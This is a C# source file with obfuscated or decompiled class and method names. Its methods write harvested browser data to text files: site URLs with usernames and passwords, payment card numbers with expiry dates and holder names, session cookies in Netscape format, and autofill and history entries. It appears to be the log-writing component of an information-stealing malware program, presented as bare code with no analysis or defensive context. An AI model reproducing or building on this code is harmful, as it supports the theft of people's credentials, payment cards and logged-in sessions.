using System.Collections.Generic;
using System.IO;
using ns13;

namespace ns8;

internal sealed class Class31
{
	private static string smethod_0(GStruct10 gstruct10_0)
	{
		return $"Url: {gstruct10_0.String_0}\nUsername: {gstruct10_0.String_1}\nPassword: {gstruct10_0.String_2}\n\n";
	}

	private static string smethod_1(Struct3 struct3_0)
	{
		return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", Class54.smethod_5(struct3_0.String_0), struct3_0.String_0, struct3_0.String_2 + "/" + struct3_0.String_1, struct3_0.String_3);
	}

	private static string smethod_2(Struct2 struct2_0)
	{
		return $"{struct2_0.String_0}\tTRUE\t{struct2_0.String_2}\tFALSE\t{struct2_0.String_3}\t{struct2_0.String_1}\t{struct2_0.String_5}\r\n";
	}

	private static string smethod_3(Struct4 struct4_0)
	{
		return $"{struct4_0.string_0}\t\n{struct4_0.string_1}\t\n\n";
	}

	private static string smethod_4(Struct5 struct5_0)
	{
		return $"### {struct5_0.String_1} ### ({struct5_0.String_0}) {struct5_0.Int32_0}\n";
	}

	private static string smethod_5(Struct6 struct6_0)
	{
		if (!string.IsNullOrEmpty(struct6_0.String_0))
		{
			return $"### {struct6_0.String_1} ### ({struct6_0.String_0})\n";
		}
		return $"### {struct6_0.String_1} ###\n";
	}

	public static bool smethod_6(List<Struct2> list_0, string string_0)
	{
		try
		{
			foreach (Struct2 item in list_0)
			{
				File.AppendAllText(string_0, smethod_2(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_7(List<Struct4> list_0, string string_0)
	{
		try
		{
			foreach (Struct4 item in list_0)
			{
				File.AppendAllText(string_0, smethod_3(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_8(List<Struct5> list_0, string string_0)
	{
		try
		{
			foreach (Struct5 item in list_0)
			{
				File.AppendAllText(string_0, smethod_4(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_9(List<Struct6> list_0, string string_0)
	{
		try
		{
			foreach (Struct6 item in list_0)
			{
				File.AppendAllText(string_0, smethod_5(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_10(List<GStruct10> list_0, string string_0)
	{
		try
		{
			foreach (GStruct10 item in list_0)
			{
				if (!(item.String_1 == "") && !(item.String_2 == ""))
				{
					File.AppendAllText(string_0, smethod_0(item));
				}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static bool smethod_11(List<Struct3> list_0, string string_0)
	{
		try
		{
			foreach (Struct3 item in list_0)
			{
				File.AppendAllText(string_0, smethod_1(item));
			}
			return true;
		}
		catch
		{
			return false;
		}
	}
}
